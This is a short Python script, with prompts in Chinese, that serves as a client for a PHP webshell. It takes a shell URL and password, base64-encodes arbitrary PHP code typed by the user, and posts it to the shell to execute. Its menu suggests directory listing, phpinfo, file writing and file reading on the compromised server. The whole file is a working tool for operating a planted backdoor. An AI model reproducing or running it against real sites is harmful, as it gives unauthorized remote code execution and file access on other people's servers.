import requests

import base64
def menu():
    print("var_dump(scandir(''))")
    print("phpinfo();")
    print("file_put_contents('file_name','txt')")
    print("readfile('file_path')")
def main():
#给出webshell地址
    url = input("请输入url地址：")
    password = input("请输入密码：")
    option = input("请输入代码操作：").encode("utf-8")
    bs64 = base64.b64encode(option)
    data = {
        password: str(bs64, 'utf-8')
    }
    print(data)
    res = requests.post(url=url, data=data, )
    print(res.content)
menu()
main()
